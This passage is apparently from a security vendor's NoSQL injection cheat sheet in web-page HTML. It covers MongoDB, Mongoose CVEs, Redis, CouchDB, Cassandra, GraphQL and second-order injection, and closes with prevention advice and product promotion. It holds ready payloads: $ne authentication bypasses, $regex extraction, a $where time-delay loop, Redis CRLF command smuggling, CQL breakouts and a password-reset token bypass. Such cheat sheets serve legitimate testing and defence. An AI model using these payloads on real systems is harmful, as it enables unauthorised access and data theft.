er-side-javascript-is-enabled"><h4>Time-based blind (only where server-side=
 JavaScript is enabled)</h4><pre contenteditable=3D"false" class=3D"w-code-=
block" style=3D"display:block;overflow-x:auto;background:#2b2b2b;color:#f8f=
8f2;padding:0.5em"><code class=3D"language-plaintext" style=3D"white-space:=
pre-wrap"><span><span>{"$where": "var d =3D new Date(); do { var c =3D new =
Date(); } while (c - d &lt; 5000); return true;"}</span></span></code></pre=
><p>In some drivers and application layers, a null byte can also truncate a=
 string value before it reaches the query (<code>category=3Dfizzy%00</code>=
), which may drop conditions that were supposed to follow it. Whether that =
works depends entirely on the specific driver, language runtime, and MongoD=
B version, so treat it as a quick test worth trying rather than a technique=
 to rely on.</p></div></div><div id=3D"php-and-framework-specific-parameter=
-injection" style=3D"scroll-margin-top: 8rem;"><h3>PHP and framework-specif=
ic parameter injection</h3><p>In PHP, <code>username[]=3Dvalue</code> creat=
es an array, and PHP=E2=80=99s request-parsing conventions extend this to n=
ested keys: <code>username[$ne]=3Dvalue</code> is parsed as <code>array('us=
ername' =3D&gt; array('$ne' =3D&gt; 'value'))</code>. Express.js with the <=
code>qs</code> query-string parser behaves the same way. This is why the br=
acket-notation payloads throughout this cheat sheet work directly as URL pa=
rameters without needing a raw JSON body:</p><pre contenteditable=3D"false"=
 class=3D"w-code-block" style=3D"display:block;overflow-x:auto;background:#=
2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"language-plaintext" styl=
e=3D"white-space:pre-wrap"><span><span>GET /api/users?username[$ne]=3Dinval=
id&amp;password[$ne]=3Dinvalid</span></span></code></pre></div><div id=3D"h=
ttp-header-injection" style=3D"scroll-margin-top: 8rem;"><h3>HTTP header in=
jection</h3><p>If a custom header is read into a query without type checkin=
g, the same operator-injection primitive applies there too:</p><pre content=
editable=3D"false" class=3D"w-code-block" style=3D"display:block;overflow-x=
:auto;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"langua=
ge-plaintext" style=3D"white-space:pre-wrap"><span><span>X-User: {"$ne": nu=
ll}</span></span></code></pre><p>This is less common than body or parameter=
 injection, since most applications treat headers as plain strings more con=
sistently than they treat body fields, but it=E2=80=99s worth a quick check=
 on any endpoint that trusts a custom header for identity or filtering.</p>=
</div></div><div id=3D"mongoose-odm-injection" style=3D"scroll-margin-top: =
8rem;"><h2>Mongoose ODM injection</h2><p>Mongoose is the most widely used M=
ongoDB object data modeling (ODM) library for Node.js. Two vulnerabilities =
disclosed in its <code>populate()</code> method in late 2024 and early 2025=
 are directly relevant to NoSQL injection testing, because they show that a=
n ODM layer marketed as a safety net can still pass raw operators through t=
o the database if the application forwards request data into it without an =
allowlist.</p><div id=3D"cve-2024-53900-and-cve-2025-23061" style=3D"scroll=
-margin-top: 8rem;"><h3>CVE-2024-53900 and CVE-2025-23061</h3><p><a rel=3D"=
nofollow noopener noreferrer" href=3D"https://nvd.nist.gov/vuln/detail/CVE-=
2024-53900" target=3D"_blank" data-wf-native-id-path=3D"1d391001-c602-9db1-=
8832-1c780ed4b171" data-wf-ao-click-engagement-tracking=3D"true" data-wf-el=
ement-id=3D"1d391001-c602-9db1-8832-1c780ed4b171">CVE-2024-53900</a> affect=
s Mongoose versions before 8.8.3 (and the corresponding fixes on the 7.x an=
d 6.x lines, 7.8.3 and 6.13.5). The vulnerability isn=E2=80=99t in MongoDB=
=E2=80=99s own <code>$where</code> sandbox, which restricts what server-sid=
e JavaScript can do =E2=80=93 it=E2=80=99s actually in how Mongoose evaluat=
es <code>populate({ match: ... })</code> conditions.&nbsp;</p><p>Mongoose u=
ses a third-party library called <code>sift</code> to apply <code>match</co=
de> filters in-process, on the Node.js application server itself, and <code=
>sift</code> JavaScript evaluation has no equivalent sandbox. If an applica=
tion forwards an attacker-controlled object into <code>populate({ match: ..=
. })</code> without validating its shape, a <code>$where</code> value that =
MongoDB=E2=80=99s own query engine would reject can still reach <code>sift<=
/code> and execute as JavaScript on the application server, not the databas=
e:</p><pre contenteditable=3D"false" class=3D"w-code-block" style=3D"displa=
y:block;overflow-x:auto;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><co=
de class=3D"language-javascript" style=3D"white-space:pre-wrap"><span><span=
 style=3D"color:#d4d0ab">// Vulnerable application code:</span><span>
</span></span><span><span>Post.find().populate({ </span><span class=3D"hljs=
-attr">path</span><span>: </span><span style=3D"color:#abe338">'author'</sp=
an><span>, </span><span class=3D"hljs-attr">match</span><span>: req.query.a=
uthor });</span></span></code></pre><p>The distinction matters for impact: =
this is remote code execution against the Node.js process itself, not just =
a database-level injection. Public writeups on this CVE describe crafting a=
 <code>$where</code> value that MongoDB=E2=80=99s engine tolerates without =
error (so the query still reaches <code>sift</code>) and that then executes=
 as arbitrary code once it does.</p><p><a rel=3D"nofollow noopener noreferr=
er" href=3D"https://nvd.nist.gov/vuln/detail/CVE-2025-23061" target=3D"_bla=
nk" data-wf-native-id-path=3D"1d391001-c602-9db1-8832-1c780ed4b17d" data-wf=
-ao-click-engagement-tracking=3D"true" data-wf-element-id=3D"1d391001-c602-=
9db1-8832-1c780ed4b17d">CVE-2025-23061</a> is a bypass of the CVE-2024-5390=
0 patch, affecting Mongoose versions before 8.9.5 (7.8.4 and 6.13.6 on the =
older lines). The original fix blocked <code>$where</code> at the top level=
 of a <code>match</code> object, but Mongoose only checked the top-level pr=
operties of each object in the match array; a <code>$where</code> operator =
nested inside an <code>$or</code> clause slipped past that check and still =
reached sift:</p><pre contenteditable=3D"false" class=3D"w-code-block" styl=
e=3D"display:block;overflow-x:auto;background:#2b2b2b;color:#f8f8f2;padding=
:0.5em"><code class=3D"language-plaintext" style=3D"white-space:pre-wrap"><=
span><span>{"$or": [{"$where": "&lt;expression&gt;"}]}</span></span></code>=
</pre><p>This was fixed in Mongoose 8.9.5. If your target application is on=
 an older 8.x release than that, or on 7.x before 7.8.4 or 6.x before 6.13.=
6, both variants are worth testing.</p></div><div id=3D"mitigating-populate=
-injection" style=3D"scroll-margin-top: 8rem;"><h3>Mitigating populate() in=
jection</h3><p>Update to Mongoose 8.9.5 or later, which closes both the ori=
ginal issue and the nested-operator bypass. Beyond patching, don=E2=80=99t =
forward <code>req.query</code> or <code>req.body</code> objects directly in=
to <code>populate()</code> at all: build the match object field by field fr=
om an explicit allowlist of expected scalar values, so there=E2=80=99s no p=
ath for an operator key to reach the query regardless of what future bypass=
 surfaces.</p></div></div><div id=3D"redis-injection" style=3D"scroll-margi=
n-top: 8rem;"><h2>Redis injection</h2><p>Redis is a key-value store whose w=
ire protocol (RESP) is plain, newline-delimited text. Redis injection isn=
=E2=80=99t about manipulating a query language, as with MongoDB, CQL, or SQ=
L injection, but more about an application building a raw command string by=
 concatenating user input, which lets an attacker terminate one command and=
 start another.</p><div id=3D"crlf-and-resp-injection" style=3D"scroll-marg=
in-top: 8rem;"><h3>CRLF and RESP injection</h3><p>If application code const=
ructs a Redis command by string concatenation and sends it over a raw socke=
t, injecting a carriage return and line feed (<code>\r\n</code>) can, in pr=
inciple, terminate the intended command and start a new one:</p><pre conten=
teditable=3D"false" class=3D"w-code-block" style=3D"display:block;overflow-=
x:auto;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"langu=
age-plaintext" style=3D"white-space:pre-wrap"><span><span>key\r\nSET inject=
ed_key "malicious_value"\r\n</span></span></code></pre><p>In practice, this=
 is rarely a directly reachable web parameter. A more common real-world pat=
h is <a href=3D"https://www.invicti.com/learn/server-side-request-forgery-s=
srf" data-wf-native-id-path=3D"1d391001-c602-9db1-8832-1c780ed4b194" data-w=
f-ao-click-engagement-tracking=3D"true" data-wf-element-id=3D"1d391001-c602=
-9db1-8832-1c780ed4b194">server-side request forgery (SSRF)</a> into an int=
ernal Redis instance, using the Gopher protocol to smuggle a raw RESP paylo=
ad past an application that never intended to expose Redis to the internet =
at all. If you=E2=80=99re testing an application for Redis injection, check=
 for SSRF-reachable internal services first =E2=80=93 that=E2=80=99s usuall=
y where the actual exposure lives, not in a form field that talks to Redis =
directly.</p><p>Redis=E2=80=99s <code>EVAL</code> command runs a Lua script=
 server-side, and if an endpoint exposes it (directly or through a manageme=
nt interface that shouldn=E2=80=99t be internet-facing), an attacker with a=
ccess can read or write arbitrary keys with a command like:</p><pre content=
editable=3D"false" class=3D"w-code-block" style=3D"display:block;overflow-x=
:auto;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"langua=
ge-plaintext" style=3D"white-space:pre-wrap"><span><span>EVAL "return redis=
.call('GET', KEYS[1])" 1 secret_key</span></span></code></pre><p>That=E2=80=
=99s less an injection technique than a configuration failure: <code>EVAL</=
code> shouldn=E2=80=99t be reachable by an untrusted caller in the first pl=
ace, but it=E2=80=99s worth checking for on the same pass as CRLF injection=
 since both stem from Redis being reachable when it shouldn=E2=80=99t be.</=
p></div></div><div id=3D"couchdb-injection" style=3D"scroll-margin-top: 8re=
m;"><h2>CouchDB injection</h2><p>CouchDB stores documents as JSON and offer=
s two query surfaces: the Mango query language (JSON-based, similar in spir=
it to MongoDB=E2=80=99s) and JavaScript-based map/reduce views.</p><div id=
=3D"mango-query-operator-injection" style=3D"scroll-margin-top: 8rem;"><h3>=
Mango query operator injection</h3><div id=3D"authentication-bypass"><h4>Au=
thentication bypass</h4><pre contenteditable=3D"false" class=3D"w-code-bloc=
k" style=3D"display:block;overflow-x:auto;background:#2b2b2b;color:#f8f8f2;=
padding:0.5em"><code class=3D"language-plaintext" style=3D"white-space:pre-=
wrap"><span><span>{"selector": {"username": {"$ne": "nobody"}, "password": =
{"$ne": "invalid"}}}</span></span></code></pre></div><div id=3D"data-extrac=
tion-via-dollarregex"><h4>Data extraction via $regex</h4><pre contenteditab=
le=3D"false" class=3D"w-code-block" style=3D"display:block;overflow-x:auto;=
background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"language-pla=
intext" style=3D"white-space:pre-wrap"><span><span>{"selector": {"username"=
: "admin", "password": {"$regex": "^p"}}}</span></span></code></pre><p>The =
underlying logic is the same as MongoDB operator injection, since Mango del=
iberately mirrors MongoDB=E2=80=99s query operator syntax.</p></div></div><=
div id=3D"cve-2017-12635-and-cve-2017-12636" style=3D"scroll-margin-top: 8r=
em;"><h3>CVE-2017-12635 and CVE-2017-12636</h3><p>The clearest real-world e=
xample of CouchDB=E2=80=99s data-handling model going wrong isn=E2=80=99t o=
perator injection at all: it=E2=80=99s a parser discrepancy. <a rel=3D"nofo=
llow noopener noreferrer" href=3D"https://nvd.nist.gov/vuln/detail/CVE-2017=
-12635" target=3D"_blank" data-wf-native-id-path=3D"1d391001-c602-9db1-8832=
-1c780ed4b1b1" data-wf-ao-click-engagement-tracking=3D"true" data-wf-elemen=
t-id=3D"1d391001-c602-9db1-8832-1c780ed4b1b1">CVE-2017-12635</a> exploited =
the fact that CouchDB=E2=80=99s Erlang-based JSON parser and its JavaScript=
-based JSON parser handled duplicate <code>roles</code> keys differently. A=
 submitted <code>_users</code> document with two <code>roles</code> keys go=
t validated against the first key but stored using the second, letting a no=
n-admin user grant themselves the <code>_admin</code> role. Chained with <a=
 rel=3D"nofollow noopener noreferrer" href=3D"https://nvd.nist.gov/vuln/det=
ail/CVE-2017-12636" target=3D"_blank" data-wf-native-id-path=3D"1d391001-c6=
02-9db1-8832-1c780ed4b1b4" data-wf-ao-click-engagement-tracking=3D"true" da=
ta-wf-element-id=3D"1d391001-c602-9db1-8832-1c780ed4b1b4">CVE-2017-12636</a=
>, which allowed configuration changes that pointed CouchDB at an arbitrary=
 executable, this became a path from an unauthenticated write to remote cod=
e execution. Affected versions were CouchDB before 1.7.0 and 2.x before 2.1=
.1; both were fixed in 1.7.1 and 2.1.1.</p><p>This pair is a good reminder =
that =E2=80=9CNoSQL injection=E2=80=9D in practice sometimes means classic =
operator injection and sometimes a data format mismatch between two parsers=
 that were never supposed to disagree. Both are worth testing for.</p></div=
></div><div id=3D"cassandra-injection-cql-injection" style=3D"scroll-margin=
-top: 8rem;"><h2>Cassandra injection (CQL injection)</h2><p>Cassandra uses =
the Cassandra Query Language (CQL), which looks superficially like SQL but =
is stripped of several features that most SQL-injection technique lists ass=
ume exist. CQL has no <code>UNION</code>, no subqueries, and no <code>OR</c=
ode> operator, so a query that includes <code>WHERE col1 =3D 'a' OR col2 =
=3D 'b'</code> is simply rejected. There=E2=80=99s also no <code>SLEEP()</c=
ode> function, which rules out the classic time-based blind approach.</p><p=
>What actually works against CQL is a much narrower set of techniques.</p><=
div id=3D"breaking-out-of-a-quoted-string-literal" style=3D"scroll-margin-t=
op: 8rem;"><h3>Breaking out of a quoted string literal</h3><p>If an applica=
tion builds a CQL statement by concatenating a string value into single quo=
tes, closing that quote early and appending a second clause can work, in th=
e same structural sense as classic SQL string-termination injection, but li=
mited by what CQL=E2=80=99s <code>WHERE</code> clause can actually express =
(a single table, no joins, no subqueries):</p><pre contenteditable=3D"false=
" class=3D"w-code-block" style=3D"display:block;overflow-x:auto;background:=
#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"language-sql" style=3D"=
white-space:pre-wrap"><span><span style=3D"color:#abe338">' AND col2 =3D '<=
/span><span style=3D"color:#dcc6e0">value</span></span></code></pre></div><=
div id=3D"abusing-allow-filtering" style=3D"scroll-margin-top: 8rem;"><h3>A=
busing ALLOW FILTERING</h3><p>CQL blocks queries that would require a full =
cluster scan unless the query explicitly opts in with <code>ALLOW FILTERING=
</code>. If an application appends user input directly to a query and that =
input can inject the <code>ALLOW FILTERING</code> keyword, an attacker can =
force a scan-based query the schema was designed to prevent, which can expo=
se data outside the intended partition-key restriction:</p><pre contentedit=
able=3D"false" class=3D"w-code-block" style=3D"display:block;overflow-x:aut=
o;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"language-s=
ql" style=3D"white-space:pre-wrap"><span><span style=3D"color:#abe338">' AL=
LOW FILTERING --</span></span></code></pre></div><div id=3D"reconnaissance-=
through-system-tables" style=3D"scroll-margin-top: 8rem;"><h3>Reconnaissanc=
e through system tables</h3><p>Where the application exposes any query flex=
ibility at all, Cassandra=E2=80=99s own metadata tables are readable the no=
rmal way, without needing <code>UNION</code>:</p><pre contenteditable=3D"fa=
lse" class=3D"w-code-block" style=3D"display:block;overflow-x:auto;backgrou=
nd:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"language-sql" style=
=3D"white-space:pre-wrap"><span><span style=3D"color:#dcc6e0">SELECT</span>=
<span> keyspace_name, table_name </span><span style=3D"color:#dcc6e0">FROM<=
/span><span> system_schema.tables;
</span></span><span><span></span><span style=3D"color:#dcc6e0">SELECT</span=
><span> column_name </span><span style=3D"color:#dcc6e0">FROM</span><span> =
system_schema.columns </span><span style=3D"color:#dcc6e0">WHERE</span><spa=
n> table_name </span><span class=3D"hljs-operator">=3D</span><span> </span>=
<span style=3D"color:#abe338">'users'</span><span>;</span></span></code></p=
re></div></div><div id=3D"graphql-with-nosql-injection" style=3D"scroll-mar=
gin-top: 8rem;"><h2>GraphQL with NoSQL injection</h2><p>GraphQL APIs backed=
 by MongoDB are a common modern injection surface because the same operator=
-injection primitive applies wherever a resolver forwards a variable into a=
 query without checking its type.</p><div id=3D"operator-injection-through-=
graphql-variables" style=3D"scroll-margin-top: 8rem;"><h3>Operator injectio=
n through GraphQL variables</h3><pre contenteditable=3D"false" class=3D"w-c=
ode-block" style=3D"display:block;overflow-x:auto;background:#2b2b2b;color:=
#f8f8f2;padding:0.5em"><code class=3D"language-json" style=3D"white-space:p=
re-wrap"><span><span>query GetUser($username: String!) {
</span></span><span>  user(username: $username) {
</span><span>    id
</span><span>    email
</span><span>    passwordHash
</span><span>  }
</span><span>}</span></code></pre><pre contenteditable=3D"false" class=3D"w=
-code-block" style=3D"display:block;overflow-x:auto;background:#2b2b2b;colo=
r:#f8f8f2;padding:0.5em"><code class=3D"language-json" style=3D"white-space=
:pre-wrap"><span><span>{</span><span class=3D"hljs-attr">"username"</span><=
span>: {</span><span class=3D"hljs-attr">"$ne"</span><span>: </span><span s=
tyle=3D"color:#f5ab35">null</span><span>}}</span></span></code></pre><p>If =
the GraphQL schema declares the variable as <code>String!</code> but the re=
solver doesn=E2=80=99t enforce that at runtime before passing it to the dat=
abase driver, a JSON object can slip through despite the type annotation:</=
p><pre contenteditable=3D"false" class=3D"w-code-block" style=3D"display:bl=
ock;overflow-x:auto;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code c=
lass=3D"language-javascript" style=3D"white-space:pre-wrap"><span><span sty=
le=3D"color:#d4d0ab">// Vulnerable resolver:</span><span>
</span></span><span><span></span><span style=3D"color:#dcc6e0">const</span>=
<span> resolver =3D {
</span></span><span><span>  </span><span class=3D"hljs-attr">Query</span><s=
pan>: {
</span></span><span><span>    </span><span class=3D"hljs-attr">user</span><=
span>: </span><span class=3D"hljs-function">(</span><span class=3D"hljs-fun=
ction" style=3D"color:#f5ab35">_, { username }</span><span class=3D"hljs-fu=
nction">) =3D&gt;</span><span> User.findOne({ username })
</span></span><span><span>    </span><span style=3D"color:#d4d0ab">// An at=
tacker-supplied {"$ne": null} bypasses the intended lookup.</span><span>
</span></span><span>  }
</span><span>};</span></code></pre></div><div id=3D"introspection-to-map-th=
e-attack-surface" style=3D"scroll-margin-top: 8rem;"><h3>Introspection to m=
ap the attack surface</h3><pre contenteditable=3D"false" class=3D"w-code-bl=
ock" style=3D"display:block;overflow-x:auto;background:#2b2b2b;color:#f8f8f=
2;padding:0.5em"><code class=3D"language-json" style=3D"white-space:pre-wra=
p"><span><span>{
</span></span><span>  __schema {
</span><span>    types {
</span><span>      name
</span><span>      fields {
</span><span>        name
</span><span>        args { name type { name } }
</span><span>      }
</span><span>    }
</span><span>  }
</span><span>}</span></code></pre><p>Introspection isn=E2=80=99t an injecti=
on technique per se, but it=E2=80=99s usually the fastest way to enumerate =
which resolvers and arguments exist before testing each one for operator in=
jection.</p></div></div><div id=3D"second-order-nosql-injection" style=3D"s=
croll-margin-top: 8rem;"><h2>Second-order NoSQL injection</h2><p>Second-ord=
er NoSQL injection happens when a payload is stored by the application and =
later used in a query without sanitization, often in password reset flows, =
profile updates, or anything that round-trips a value through storage befor=
e querying with it again.</p><div id=3D"password-reset-token-bypass" style=
=3D"scroll-margin-top: 8rem;"><h3>Password reset token bypass</h3><pre cont=
enteditable=3D"false" class=3D"w-code-block" style=3D"display:block;overflo=
w-x:auto;background:#2b2b2b;color:#f8f8f2;padding:0.5em"><code class=3D"lan=
guage-plaintext" style=3D"white-space:pre-wrap"><span><span>POST /auth/rese=
t-password
</span></span><span>{
</span><span>  "email": "admin@example.com",
</span><span>  "token": {"$ne": null},
</span><span>  "newPassword": "attacker_password"
</span><span>}</span></code></pre><p>If the token field is handled as a que=
ry object rather than a strict string comparison, <code>{"$ne": null}</code=
> matches any non-null token, bypassing the reset-token check entirely. The=
 vulnerability isn=E2=80=99t in the storage step; it=E2=80=99s in the later=
 query treating a field as trusted just because it round-tripped through th=
e database once already.</p></div></div><div id=3D"nosql-injection-preventi=
on-summary" style=3D"scroll-margin-top: 8rem;"><h2>NoSQL injection preventi=
on summary</h2><ul role=3D"list"><li><strong>Never pass user-supplied objec=
ts directly into a query.</strong> Validate that each field is the expected=
 scalar type (string, number, boolean) before it reaches any database call.=
 An object where a string was expected is the entire attack class in one se=
ntence.</li><li><strong>Use strict schema validation with your ODM.</strong=
> Mongoose=E2=80=99s <code>strict</code> mode (on by default) helps, but it=
 doesn=E2=80=99t replace input validation at the API boundary; the CVE-2024=
-53900 and CVE-2025-23061 cases both involved requests reaching the ODM bef=
ore validation caught them.</li><li><strong>Disable server-side JavaScript =
if you don=E2=80=99t need it.</strong> Where possible, set <code>security.j=
avascriptEnabled: false</code> in MongoDB configuration to remove <code>$wh=
ere</code> and related operators as an attack surface entirely. Prefer <cod=
e>$expr</code> for legitimate field-to-field comparisons in new code, since=
 it doesn=E2=80=99t execute JavaScript at all.</li><li><strong>Apply least =
privilege to database accounts.</strong> An application account with read-o=
nly access to the collections it needs limits what any successful injection=
 can do, regardless of which operator got through.</li><li><strong>Never fo=
rward request objects into <code>populate()</code>, <code>match</code>, or =
<code>filter</code> helpers.</strong> Build the object field by field from =
an explicit allowlist rather than passing <code>req.body</code> or <code>re=
q.query</code> straight through.</li><li><strong>Keep ODMs and drivers curr=
ent.</strong> CVE-2024-53900 and CVE-2025-23061 show that a patched vulnera=
bility can still have a live bypass; track advisories for the specific libr=
ary versions in use, not just the database itself.</li></ul></div><div id=
=3D"automating-nosql-injection-vulnerability-testing" style=3D"scroll-margi=
n-top: 8rem;"><h2>Automating NoSQL injection vulnerability testing</h2><p>M=
anual NoSQL injection testing is harder to scale than SQL injection testing=
 because payload syntax differs by database, framework, and query context, =
and there=E2=80=99s no single dialect to master the way there is with SQL. =
Automated tools can close part of that gap, though how much depends heavily=
 on which database is in play.</p><p>For limited manual testing, open-sourc=
e or community-licensed tools can provide a starting point:</p><ul role=3D"=
list"><li>NoSQLMap, for automated detection and exploitation against MongoD=
B, CouchDB, and Redis</li><li>Burp Suite with Intruder for semi-automated t=
esting using custom operator-injection payload lists</li><li>OWASP ZAP, wit=
h limited native NoSQL coverage that benefits from custom scan rules</li></=
ul><p>For large-scale or automated testing, commercial dynamic application =
security testing (DAST) scanners are usually the better option. Vendor DAST=
 coverage for NoSQL injection concentrates on MongoDB, and for good reason:=
 it=E2=80=99s where real-world exploitation and CVE history actually accumu=
late.&nbsp;</p><p><a href=3D"https://www.invicti.com/product/dast" data-wf-=
native-id-path=3D"1621b7d2-8b98-bf2e-9fba-6ee4b1f78ed8" data-wf-ao-click-en=
gagement-tracking=3D"true" data-wf-element-id=3D"1621b7d2-8b98-bf2e-9fba-6e=
e4b1f78ed8">Invicti DAST</a> provides four dedicated MongoDB injection engi=
nes:</p><ul role=3D"list"><li>Error-based detection for MongoDB-specific er=
ror signatures</li><li>Boolean-based detection for comparing true and false=
 conditions</li><li>Time-based blind detection for measuring response delay=
s</li><li>Operator injection for testing parameters with <code>$ne</code>, =
<code>$gt</code>, <code>$regex</code>, and related operators</li></ul><p>Al=
l four can test automatically against form parameters, JSON request bodies,=
 GraphQL parameters, and other API surfaces. The security checks are optimi=
zed to reduce false positives on applications that aren=E2=80=99t actually =
backed by MongoDB to make sure that findings reflect real MongoDB backends =
rather than coincidentally matching responses.</p><p>For Redis, CouchDB, an=
d Cassandra, the injection surfaces covered earlier in this cheat sheet are=
 narrower and, in Cassandra=E2=80=99s case, largely unprecedented in public=
 CVE or bug bounty data (as confirmed in an <a href=3D"https://www.invicti.=
com/blog/web-security/investigating-cql-injection-apache-cassandra" data-wf=
-native-id-path=3D"1d391001-c602-9db1-8832-1c780ed4b27a" data-wf-ao-click-e=
ngagement-tracking=3D"true" data-wf-element-id=3D"1d391001-c602-9db1-8832-1=
c780ed4b27a">evaluation</a> by Invicti researchers). For NoSQL databases ot=
her than MongoDB, you will generally need to test manually or with general-=
purpose tools like NoSQLMap rather than relying on a commercial DAST to cov=
er them the way MongoDB is covered.</p><p>Where Invicti confirms a MongoDB =
injection vulnerability, proof-based scanning generates a proof of exploit =
rather than a =E2=80=9Cpossible vulnerability=E2=80=9D flag, so your team c=
an prioritize the finding with confidence instead of manually reproducing t=
he attack to confirm it=E2=80=99s real.</p><p><a href=3D"https://www.invict=
i.com/clp/proof-based-scanning-whitepaper/" data-wf-native-id-path=3D"1d391=
001-c602-9db1-8832-1c780ed4b280" data-wf-ao-click-engagement-tracking=3D"tr=
ue" data-wf-element-id=3D"1d391001-c602-9db1-8832-1c780ed4b280">Learn how I=
nvicti=E2=80=99s proof-based scanning works</a> or<a href=3D"https://www.in=
victi.com/get-demo/" data-wf-native-id-path=3D"1d391001-c602-9db1-8832-1c78=
0ed4b283" data-wf-ao-click-engagement-tracking=3D"true" data-wf-element-id=
=3D"1d391001-c602-9db1-8832-1c780ed4b283"> request a demo</a> to see automa=
ted NoSQL injection detection in action.</p></div><div id=3D"nosql-injectio=
n-classification-and-severity" style=3D"scroll-margin-top: 8rem;"><h2>NoSQL=
 injection classification and severity</h2><div class=3D"w-embed"><table st=
